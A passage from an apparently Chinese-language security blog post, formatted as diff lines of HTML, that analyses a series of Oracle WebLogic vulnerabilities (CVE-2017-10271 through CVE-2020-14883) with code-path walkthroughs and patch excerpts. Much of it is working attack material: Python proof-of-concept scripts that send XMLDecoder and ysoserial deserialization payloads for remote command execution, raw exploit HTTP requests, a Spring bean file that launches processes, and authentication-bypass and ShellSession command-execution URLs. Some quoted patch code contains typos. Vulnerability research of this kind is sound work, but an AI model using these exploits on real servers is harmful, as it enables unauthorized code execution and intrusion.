+    &lt;/soapenv:Envelope&gt;
+    &#39;&#39;&#39; % cmd
+
+    try:
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
+        response = response.text
+        response = re.search(r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;, response).group(0)
+    except Exception as e:
+        response = &quot;&quot;
+        print(&#39;[*]&#39;, e)
+
+    if &#39;&lt;faultstring&gt;java.lang.ProcessBuilder&#39; in response or &quot;&lt;faultstring&gt;0&quot; in response:
+        result = &quot;[+] test ok&quot;
+        return result
+    else:
+        result = &quot;[*] No Vulnerability&quot;
+        return result
+
+if __name__ == &#39;__main__&#39;:
+    if len(sys.argv) &lt; 3:
+        print(&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)
+        sys.exit(0)
+    else:
+        ip = sys.argv[1]
+        cmd = &#39; &#39;.join(sys.argv[2:])
+        print(&#39;[*] send payload:&#39;, cmd)
+        print(poc(ip, cmd))</code></pre>
+<p>此外还有<code>new</code>标签也可以利用</p>
+<blockquote>
+<p>注意jdk6不支持<code>new</code>等标签</p>
+</blockquote>
+<pre><code class="java">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+    &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;
+        &lt;string&gt;calc&lt;/string&gt;
+        &lt;method name=&quot;start&quot;/&gt;
+    &lt;/new&gt;
+&lt;/java&gt;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>因为和CVE-2017-3506几乎一样，这里就不分析了，其实就是把<code>object</code>标签更改为其他可用的，比如<code>void</code></p>
+<p><strong>补丁</strong></p>
+<p>对涉及到的<code>object、new、method、void、array</code>类型都进行了检测</p>
+<pre><code class="java">private void validate(InputStream is) &#123;
+    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+    try &#123;
+        SAXParser parser = factory.newSAXParser();
+        parser.parse(is, new DefaultHandler()) &#123;
+            private int overallarraylength = 0;
+            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXEception &#123;
+                if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;
+                    throw new IllegalStateException(&quot;Invalid element qName:object&quot;);
+                &#125; else if (qName.equalsIgnoreCase(&quot;new&quot;)) &#123;
+                    throw new IllegalStateException(&quot;Invalid element qName:new&quot;);
+                &#125; else if (qName.equalsIgnoreCase(&quot;method&quot;)) &#123;
+                    throw new IllegalStateException(&quot;Invalid element qName:method&quot;);
+                &#125; else &#123;
+                    if (qName.equalsIgnoreCase(&quot;void&quot;)) &#123;
+                        for (int attClass = 0;attClass &lt; attributes.getLength(); ++attClass) &#123;
+                            if (!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;
+                                throw new IllegalStateException(&quot;Invalid attribute for element void: &quot; + attributes.getQName(attClass));
+                            &#125;
+                        &#125;
+                    &#125;
+                    if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;
+                        String var9 = attributes.getValue(&quot;class&quot;);
+                        if (var9 != null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;
+                            throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);
+                        &#125;
+                    &#125;
+                    ......
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<blockquote>
+<p>这个漏洞在市面上流传的很多payload都是没有考虑CVE-2017-10271的补丁，直接就是新入口+旧payload，比如&lt;void class=”xxx”&gt;</p>
+<p>真正意义上的对CVE-2017-10271的绕过的关键点在于对&lt;class&gt;标签的利用，即我们可以利用&lt;class&gt;标签来创建任意类的实例</p>
+<p>目前能利用的类有</p>
+<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p>
+<p>com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p>
+<p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（version &lt;= 10.36，因为超过这个版本就不存在了）</p>
+</blockquote>
+<p><em>版本 1（ version &lt;= 10.36 ）</em></p>
+<blockquote>
+<p>因为我这里用的是<code>vulhub/weblogic:10.3.6</code>，所以用的是<code>CommonsCollections1</code>的Gadget作为测试，其他情况视具体环境而定</p>
+</blockquote>
+<pre><code class="python">#!/usr/bin/python3
+import requests
+import re
+import sys
+import subprocess
+import struct
+
+headers = &#123;&#39;Content-Type&#39;:&#39;text/xml&#39;&#125;
+
+def gen_payload(cmd):
+    try:
+        gen_ser = &quot;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#39;%s&#39;&quot; % cmd
+        print(&quot;[*] generate CommonsCollections1 payload: %s&quot; % gen_ser)
+        poc_ser = subprocess.Popen(gen_ser, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
+    except Exception as e:
+        print(&quot;[*] generate CommonsCollections1 payload failed&quot;)
+        sys.exit(0)
+
+    xml = &quot;&quot;&quot;
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
+       &lt;soapenv:Header&gt;
+          &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;
+          &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;
+          &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+             &lt;java&gt;
+                &lt;class&gt;
+                   &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;
+                   &lt;void&gt;
+                      &lt;array class=&quot;byte&quot; length=&quot;%d&quot;&gt;
+                        %s
+                      &lt;/array&gt;
+                   &lt;/void&gt;
+                &lt;/class&gt;
+             &lt;/java&gt;
+          &lt;/work:WorkContext&gt;
+       &lt;/soapenv:Header&gt;
+       &lt;soapenv:Body&gt;
+          &lt;asy:onAsyncDelivery /&gt;
+       &lt;/soapenv:Body&gt;
+    &lt;/soapenv:Envelope&gt;
+    &quot;&quot;&quot;
+
+    exploit = &#39;&#39;
+    _index = 0
+    for i in poc_ser:
+        _byte = int.from_bytes(struct.pack(&quot;B&quot;, i), byteorder=&#39;big&#39;, signed=True)
+        exploit += &quot;&quot;&quot;
+            &lt;void index=&quot;%d&quot;&gt;
+                &lt;byte&gt;%d&lt;/byte&gt;
+            &lt;/void&gt;
+        &quot;&quot;&quot; % (_index, _byte)
+        _index += 1
+
+    payload = xml % (_index, exploit)
+    return(payload)
+
+def poc(url, cmd):
+    url += &#39;/_async/AsyncResponseService&#39;
+    data = gen_payload(cmd)
+    try:
+        print(&quot;[*] send payload&quot;)
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
+        if response.status_code == 202:
+          result = &quot;[+] test ok&quot;
+          return result
+        else:
+          result = &quot;[*] No Vulnerability&quot;
+    except Exception as e:
+          result = &#39;[*] error: &#39; + str(e)
+    return result
+
+
+if __name__ == &#39;__main__&#39;:
+    if len(sys.argv) &lt; 3:
+        print(&quot;python3 poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)
+        sys.exit(0)
+    else:
+        ip = sys.argv[1]
+        cmd = &#39; &#39;.join(sys.argv[2:])
+        print(poc(ip, cmd))
+</code></pre>
+<p><em>版本 2（通杀版本）</em></p>
+<blockquote>
+<p>这个payload执行的前提是支持spel表达式</p>
+</blockquote>
+<pre><code class="http">POST /_async/AsyncResponseService HTTP/1.1
+Host: 127.0.0.1:7001
+Content-Type: text/xml
+Content-Length: 849
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
+   &lt;soapenv:Header&gt;
+      &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
+      &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
+      &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+         &lt;java&gt;
+            &lt;class&gt;
+               &lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;
+               &lt;void&gt;
+                  &lt;string&gt;http://127.0.0.1:8000/poc.xml&lt;/string&gt;
+               &lt;/void&gt;
+            &lt;/class&gt;
+         &lt;/java&gt;
+      &lt;/work:WorkContext&gt;
+   &lt;/soapenv:Header&gt;
+   &lt;soapenv:Body&gt;
+      &lt;asy:onAsyncDelivery /&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+<pre><code class="xml">// poc.xml
+
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+  &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
+    &lt;constructor-arg&gt;
+      &lt;list&gt;
+        &lt;value&gt;cmd&lt;/value&gt;
+        &lt;value&gt;/c&lt;/value&gt;
+        &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt;
+      &lt;/list&gt;
+    &lt;/constructor-arg&gt;
+  &lt;/bean&gt;
+&lt;/beans&gt;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>漏洞发生原因是<code>wls9_async_response.war</code>包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，这个漏洞可以说是对CVE-2017-10271的另一个入口和补丁绕过</p>
+<p>首先我们的漏洞入口在<code>weblogic.wsee.async.AsyncResponseHandler</code>类的<code>handleRequest</code>方法上，设置RelatesTo属性进入else分支</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440e3e017f766fb6a66592c.png" alt="image-20210125225235703"></p>
+<p>一直往下走就会来到<code>weblogic.wsee.server.servlet.SoapProcessor</code>的<code>process()</code>和<code>handlePost()</code>方法，而后会调用WsSkel的<code>invoke()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440d5d936b63cd9392dd39f.png" alt="image-20210126003209680"></p>
+<p>跟进<code>invoke()</code>方法，实例化了ServerDispatcher对象，并调用了<code>dispatch()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714402eae817942a7069a06c6.png" alt="image-20210126003353598"></p>
+<p>在<code>dispatch()</code>方法中，对<code>InternalHandlerList</code>进行<code>setHandlerChain()</code>操作，然后再调用<code>getHandlerChain().handleRequest()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441b32c4ed5ac5b74657213.png" alt="image-20210126003819404"></p>
+<p><code>handleRequest()</code>方法根据handlers列表依次调用每个handler的<code>handleRequest()</code>，但只要某个handler的<code>handleRequest()</code>返回false则直接return，后面handler的<code>handleRequest()</code>将不会被调用</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714410b478e7ac4f3dda1e107.png" alt="image-20210126004609041"></p>
+<p>handlers列表如下，其中有四个需要重点关注的handler，我们需要确保它们能够全部执行，即至少执行到第17个handler</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144100afeeea5b38f6634fda.png" alt="image-20210126005217365"></p>
+<p>在<code>ServerAddressingHandler.handleRequest()</code>中，先关注<code>setWSAVersion()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144190acff0e93c16031c5b0.png" alt="image-20210126005628769"></p>
+<p>其中<code>setWSAVersion()</code>中获取请求中Message的ActionHeader，根据ActionHeader中namespaceURI的不同进行不同的处理，而我们的目的是为了跳过<code>weblogic.wsee.addressing.version</code>的赋值，原因在下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441fa1e92c15c1c82618a24.png" alt="image-20210126005838925"></p>
+<p>在<code>validateWSAVersion()</code>函数中，如果<code>weblogic.wsee.addressing.version</code>属性若为空，则设置为<code>WSAVersion.WSA10</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144232591d48de3c89bd8fae.png" alt="image-20210126010047616"></p>
+<p>回到<code>handleRequest()</code>往下看，当版本号等于<code>WSAVersion.WSA10</code>时var24为true</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442b9f7b3b216175f920672.png" alt="image-20210126010718096"></p>
+<p>继续往下看，判断MsgHeader中的ActionHeader、RelatesToHeader存在则对相应属性进行赋值，同时使var23、var28为true，而var23、var28跟var24直接影响是否抛出异常，如果抛出异常<code>handlers</code>将无法继续往下遍历</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714425c3eb9528db65e68e19d.png" alt="image-20210126010423073"></p>
+<p>下面来到<code>AsyncResponseHandler的handleRequest()</code>，我们需要保证Message的<code>weblogic.wsee.addressing.RelatesTo</code>属性的值为非空，否则会返回false，将导致<code>handlers</code>无法继续往下遍历</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442078b286cbbb2273d9237.png" alt="image-20210126011018421"></p>
+<p>接着来到<code>OperationLookupHandler</code>的<code>handleRequest()</code>，保证Message中的<code>OperationName</code>为非空，否则会抛出异常，令<code>handlers</code>无法继续往下遍历</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714421f820f16703317a92e86.png" alt="image-20210126011223780"></p>
+<p>最后来到<code>WorkAreaServerHandler</code>的<code>handleRequest()</code>，把Header的WorkAreaHeader部分传入<code>WorkContextXmlInputAdapter()</code>进行实例化，然后调用<code>receiveRequest()</code>处理，后面的就和CVE-2017-10271的漏洞分析一样了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442a84d39b0bf88d93ec0f1.png" alt="image-20210126011330536"></p>
+<p><strong>补丁</strong></p>
+<p>增加了对class标签的限制和array中length的大小限制</p>
+<pre><code class="java">private void validate(InputStream is) &#123;
+   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+   try &#123;
+      SAXParser parser = factory.newSAXParser();
+      parser.parse(is, new DefaultHandler() &#123;
+         private int overallarraylength = 0;
+         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;
+            if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;
+               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);
+            &#125; else if (qName.equalsIgnoreCase(&quot;class&quot;)) &#123; // new
+               throw new IllegalStateException(&quot;Invalid element qName:class&quot;); 
+            &#125; else if (qName.equalsIgnoreCase(&quot;new&quot;)) &#123;
+               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);
+            &#125; else if (qName.equalsIgnoreCase(&quot;method&quot;)) &#123;
+               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);
+            &#125; else &#123;
+               if (qName.equalsIgnoreCase(&quot;void&quot;)) &#123;
+                  for(int i = 0; i &lt; attributes.getLength(); ++i) &#123;
+                     if (!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(i))) &#123;
+                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(i));
+                     &#125;
+                  &#125;
+               &#125;
+               if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;
+                  String attClass = attributes.getValue(&quot;class&quot;);
+                  if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(&quot;byte&quot;)) &#123;
+                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);
+                  &#125;
+                  String lengthString = attributes.getValue(&quot;length&quot;);
+                  if (lengthString != null) &#123;
+                     try &#123;
+                        int length = Integer.valueOf(lengthString);
+                        if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123; // MAXARRAYLENGTH==10000
+                           throw new IllegalStateException(&quot;Exceed array length limitation&quot;);
+                        &#125;
+                        this.overallarraylength += length;
+                        if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;
+                           throw new IllegalStateException(&quot;Exceed over all array limitation.&quot;);
+                        &#125;
+                     &#125; catch (NumberFormatException var8) &#123;</code></pre>
+<h4 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p>
+<pre><code class="shell">python oracle-weblogic-deserialize.py -u http://127.0.0.1:7001 -c &#39;touch /tmp/success&#39;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>该漏洞是对CVE-2019-2725的补丁绕过，在jdk7中解析xml时获取element元素的相关类为<code>com.sun.beans.decoder.DocumentHandler</code></p>
+<p>因为在jdk7为array元素添加属性时，只能从length，class，id中选择，而唯一能创建类的class已经被加入了黑名单，所以jdk1.7版本不受此漏洞影响，这次的绕过主要针对低于1.7的jdk版本</p>
+<p>而weblogic1036自带的jdk版本为1.6，jdk1.6中解析xml时有很大差异，相关处理方法在<code>com.sun.beans.ObjectHandler</code>，我们从<code>startElemen()</code>方法入手</p>
+<p>在对标签进行解析时，会对其类、属性和方法进行检查，如果存在就对其进行设置，如果方法不存在，就会生成一个new方法，如果存入<code>forName</code>值的话，我们就可以引入任意类了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442f4b576f32f3d2cd492ab.png" alt="image-20210126170922028"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271443139fce816fdee93e2625.png" alt="image-20210126172345512"></p>
+<p>所以绕过方法就是使用<code>&lt;array method=&quot;forName&quot;&gt;</code>来代替上面的<code>&lt;class&gt;</code>即可绕过黑名单</p>
+<p><strong>补丁</strong></p>
+<p>使用白名单进行修复</p>
+<p>增加了一层<code>validateFormat</code>过滤，增加白名单限制</p>
+<pre><code class="java">public class WorkContextFormatInfo &#123;
+    public static final Map&lt;String, Map&lt;String, String&gt;&gt; allowedName = new HashMap();
+
+    public WorkContextFormatInfo() &#123;
+    &#125;
+
+    static &#123;
+        allowedName.put(&quot;string&quot;, (Object)null);
+        allowedName.put(&quot;int&quot;, (Object)null) ;
+        allowedName.put(&quot;long&quot;, (Object)null);
+        Map&lt;String, String&gt; allowedAttr = new HashMap();
+        allowedAttr.put(&quot;class&quot;, &quot;byte&quot;);
+        allowedAttr.put(&quot;length&quot;, &quot;any&quot;);
+        allowedName.put(&quot;array&quot;, allowedAttr);
+        allowedAttr = new HashMap();
+        allowedAttr.put(&quot;index&quot;, &quot;any&quot;);
+        allowedNameput(&quot;void&quot;, allowedAttr);
+        allowedNameput(&quot;byte&quot;, (Object)null);
+        allowedName.put(&quot;boolean&quot;, (Object)null);
+        allowedName.put(&quot;short&quot;, (Object)null);
+        allowedName.put(&quot;char&quot;, (Object)null);
+        allowedName.put(&quot;float&quot;, (Object)null);
+        allowedName.put(&quot;double&quot;, (Object)null) ;
+        allowedAttr = new HashMap();
+        allowedAttr.put(&quot;class&quot;, &quot;java.beans.XMLDecoder&quot;) ;
+        allowedAttr.put(&quot;version&quot;, &quot;any&quot;);
+        allowedName.put &quot;java&quot;, allowedattr);
+    &#125;
+&#125;</code></pre>
+<h4 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="*CVE-2020-14882"></a>*CVE-2020-14882</h4><blockquote>
+<p>Oracle WebLogic Server  10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>我们将入口点定义到WebLogic处理Servlet请求的函数当中</p>
+<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\internal\WebAppServletContext.class#execute</code></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160713802.png" alt="image-20211112160713802"></p>
+<p>在判断完<code>url</code>非访问<code>/WEB-INF</code>或<code>/META-INF</code>文件时就会执行就下面的<code>securedExecute()</code>函数继续解析</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160956483.png" alt="image-20211112160956483"></p>
+<p>持续根据就会来到<code>doSecuredExecute()</code>函数，这里的<code>checkAccess()</code>函数会用户进行鉴权操作</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112170050066.png" alt="image-20211112170050066"></p>
+<p>如果我们想要绕过下面的认证就需令这个<code>resourceConstraint</code>变量不为空</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112170102720.png" alt="image-20211112170102720"></p>
+<p><code>getConstraint()</code>函数是用来判断当前<code>url</code>是否在请求静态资源，如果是的话就会放回对应的静态资源列表，其中具体实现如下</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112171248252.png" alt="image-20211112171248252"></p>
+<p>因为这里的<code>this.constraintsMap</code>字典只有一个<code>&quot;&quot;</code>的键值，所以<code>consForAllMethods</code>包含了所有了静态资源列表（列表如下），而<code>consForOneMethod</code>为空，而我们的<code>relURI</code>为<code>/css/%2e%2e%2fconsole.portal</code>，所以<code>rcForAllMethods</code>匹配到了<code>/css/</code>路径，而<code>rcForOneMethod</code>本来就是空，所以根据程序逻辑，我们返回的是不为空的<code>rcForAllMethods</code>变量，从而绕过了认证操作</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171402107.png" alt="image-20211112171402107" style="zoom:67%;" />
+
+<p>接下来调用<code>isAuthorized()</code>函数来判断用户是否认证</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112172240027.png" alt="image-20211112172240027"></p>
+<p><code>isAuthorized()</code>函数内部又调用了<code>checkAccess()</code>来验证用户身份</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112174107658.png" alt="image-20211112174107658"></p>
+<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\security\internal\ChainedSecurityModule.class#checkAccess</code></p>
+<p>然后一直跟进到<code>checkUserPerm()</code>函数检查用户权限</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112174522850.png" alt="image-20211112174522850"></p>
+<p>一直跟进到<code>hasPermission()</code>函数判断用户是否有访问权限</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112221058420.png" alt="image-20211112221058420"></p>
+<p>虽然我们没有<code>AdminMode</code>，但是我们的资源列表<code>/css/*</code>是无需授权的，所以我们的<code>hasPermission()</code>返回的是<code>true</code>，一路跟下来之后<code>checkAccess()</code>函数返回的也是<code>true</code>，最终我们的<code>authorized</code>变量仍旧为<code>true</code></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112221257191.png" alt="image-20211112221257191"></p>
+<p>之后便是跟进到WebLogic从<code>web.xml</code>中的匹配模式找到对应的<code>Servlet</code>来对请求进行处理</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112172827956.png" alt="image-20211112172827956"></p>
+<p>首先我们的<code>*.portal</code>模式对应的<code>servlet-name</code>为<code>AppManagerServlet</code></p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173625448.png" alt="image-20211112173625448" style="zoom:80%;" />
+
+<p><code>AppManagerServlet</code>对应的<code>servlet-class</code>为<code>weblogic.servlet.AsyncInitServlet</code></p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173711206.png" alt="image-20211112173711206" style="zoom:80%;" />
+
+<p>根据<code>StubSecurityHelper</code>类的逻辑我们会调用到对应<code>servlet</code>的<code>service()</code>方法</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225039009.png" alt="image-20211112225039009"></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225010994.png" alt="image-20211112225010994"></p>
+<p>在<code>service()</code>函数里，只要<code>url</code>不包含<code>;</code>字符就会调用父类的<code>service()</code>方法</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112163613908.png" alt="image-20211112163613908"></p>
+<p>持续跟进到调用到<code>doGet()</code>函数，然后最终调用的是<code>doPost()</code>函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112164009192.png" alt="image-20211112164009192"></p>
+<p>这里会调用<code>createUIContext()</code>函数来获取对应的<code>jspContext</code></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225315294.png" alt="image-20211112225315294"></p>
+<p>调用<code>getTree()</code>返回控件树</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225810102.png" alt="image-20211112225810102"></p>
+<p>但是在调用<code>getTree()</code>函数时又对<code>pattern</code>进行了一次url解码，这里就是目录穿越的核心</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112230235971.png" alt="image-20211112230235971"></p>
+<p><code>processStream()</code>函数内部使用<code>getMergedControlFromFile()</code>函数从<code>file</code>（即上面<code>pattern</code>）文件中来获取对应的UI控件</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112231103897.png" alt="image-20211112231103897"></p>
+<p>调用<code>getControlFactoryFromFile()</code>函数来读取xml文件<img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116182041346.png" alt="image-20211116182041346"></p>
+<p>最后通过<code>getControlFactoryFromFileWithoutCaching()</code>获取文件内容，即本次目录穿越漏洞的<strong>Sink</strong></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116182239347.png" alt="image-20211116182239347"></p>
+<p><strong>patch</strong></p>
+<pre><code class="java">private static final String[] IllegalUrl = new String[]&#123;&quot;;&quot;, &quot;%252E%252E&quot;, &quot;%2E%2E&quot;, &quot;..&quot;, &quot;%3C&quot;, &quot;%3E&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;&#125;;</code></pre>
+<p>对路径进行校验，但是可以用小写url绕过</p>
+<h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p><strong>poc</strong></p>
+<ol>
+<li><code>ShellSession</code>命令执行（Weblogic 10.3.6无此类）</li>
+</ol>
+<pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;)</code></pre>
+<ol start="2">
+<li><code>FileSystemXmlApplicationContext</code>命令执行</li>
+</ol>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
+        &lt;constructor-arg&gt;
+          &lt;list&gt;
